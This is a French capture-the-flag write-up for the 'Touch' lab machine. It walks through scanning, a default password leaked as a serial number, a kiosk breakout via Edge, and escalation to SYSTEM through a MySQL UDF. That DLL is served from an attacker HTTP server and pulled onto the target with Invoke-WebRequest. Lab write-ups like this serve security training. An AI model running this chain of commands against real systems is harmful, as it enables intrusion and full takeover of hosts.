  # Touch

	echo "10.129.118.131 touch.htb" >> /etc/hosts
	sudo masscan -p1-65535,U:1-65535 10.129.118.131 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 -A 10.129.118.131 -oN nmap.txt

Scans classiques.

	PORT     STATE SERVICE       VERSION
	135/tcp  open  msrpc         Microsoft Windows RPC
	3389/tcp open  ms-wbt-server Microsoft Terminal Service
	5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
	8443/tcp open  http          Microsoft HTTPAPI httpd 2.0


Fuzzing

	ffuf -u http://touch.htb:8443/FUZZ -w /usr/share/wordlists/dirb/common.txt -fs 0
	ffuf -u http://touch.htb:8443/api/FUZZ -w /usr/share/wordlists/dirb/common.txt -fs 0


Numéro de série leaké qui est aussi le mot de passe par défaut ("The default password is the device serial number included in your DeviceHub packaging") :

	curl -sk http://touch.htb:8443/api/status

> {"device":"Nexion DeviceHub DH-100","serial":"NX-DH-2024-B7042","firmware":"1.4.2","status":"online","uptime":33838}


Conversion en cookie : 

	curl -sk http://touch.htb:8443/login -H "Content-Type: application/x-www-form-urlencoded" --data "password=NX-DH-2024-B7042" -c cookies.txt

Le dashboard affiche deux devices (Passport Scanner, Boarding Pass Printer) avec des credentials en clair dans le HTML (onclick handlers) :

	curl -sk http://touch.htb:8443/dashboard -b cookies.txt


## Accès RDP et breakout du kiosk

Les credentials marchent en RDP :

	mstsc /v:10.129.118.131

On tombe dans une application kiosk "HTB Airways" (self check-in) où le nom et le code de réservation fournis servent : 

> Jenny Crawford / KS7X2M

Cela pré-remplit le vol et avance jusqu'à l'étape de vérification de passeport, qui demande un scan physique.

Il faut juste éteindre le scanner depuis le dashboard admin pour forcer une erreur au moment du scan :

	curl -sk http://touch.htb:8443/api/scanner/power -b cookies.txt -X POST -H "Content-Type: application/json" -d '{"powered":false}'


Retour au kiosk avec une erreur Windows dont le lien support est cliquable. Le lien lance Microsoft Edge, cassant l'enfermement du kiosk. Depuis Edge, navigation locale en file:// :

	file:///C:/ProgramData/HTB Airways/

Le dossier contient un script refresh-dates.bat lisible par tous et avec mot de passe root MySQL en clair.       
Pour le shell : Ctrl+O dans Edge ouvre un explorateur Windows puis un simple "cmd.exe" ou "powershell.exe" dans la barre d'adresse lance un vrai terminal :

	whoami
	type ..\Desktop\user.txt

## Élévation de privilèges

Le service MySQL tourne presque toujours avec un compte à hauts privilèges à cause du besoin d'écrire ses fichiers de données où bon lui semble. MySQL ne permet pas nativement d'exécuter des commandes OS depuis du SQL mais les UDF (User Defined Functions) permettent d'étendre MySQL avec des fonctions custom écrites en C/C++ et compilées en .dll / .so principalement.


	Get-WmiObject Win32_Service -Filter "Name='mysql' OR DisplayName like '%mysql%'" | Select-Object Name,StartName,PathName,State

	Name     StartName    PathName                                               State
	MySQL80  LocalSystem  C:\MySQL\bin\mysqld.exe --defaults-file=C:\MySQL\my.ini Running

Confirmé : LocalSystem

	icacls "C:\MySQL\bin\mysqld.exe"
	icacls "C:\MySQL\lib\plugin"

> NT AUTHORITY\Authenticated Users:(M)

Confirmé : Modification pour tout le monde

DLL de Metasploit déjà faite : 

	locate lib_mysqludf_sys_64.dll
	cd /usr/share/metasploit-framework/data/exploits/mysql/
	python3 -m http.server 8000

Téléchargement depuis le shell sur la cible : 

	Invoke-WebRequest -Uri "http://10.10.14.148:8000/lib_mysqludf_sys_64.dll" -OutFile "C:\MySQL\lib\plugin\lib_mysqludf_sys_64.dll"

Cette DLL expose plusieurs fonctions, dont deux capables d'exécuter une commande système :
- sys_exec : renvoie seulement le code de retour du process (0 si succès)
- sys_eval : renvoie le stdout réel de la commande sous forme de chaîne

```
	C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026" -D mysql -e "DROP FUNCTION IF EXISTS sys_exec; DROP FUNCTION IF EXISTS sys_eval; CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys_64.dll'; CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys_64.dll';"
```

Test simple :

	C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026" -D mysql -e "SELECT sys_eval('whoami');"

Par défaut le client MySQL affiche en hexadécimal brut donc il faut forcer la conversion en texte lisible :

	C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026" -D mysql -e "SELECT CONVERT(sys_eval('whoami') USING utf8);"

> nt authority\system


Les fonctions sys_eval et sys_exec lancent le process directement (comme un CreateProcess), pas via un interpréteur. Il faut donc explicitement invoquer le shell :

	C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026" -D mysql -e "SELECT CONVERT(sys_eval('cmd.exe /c type ""C:\Users\Administrator\Desktop\root.txt""') USING utf8);"


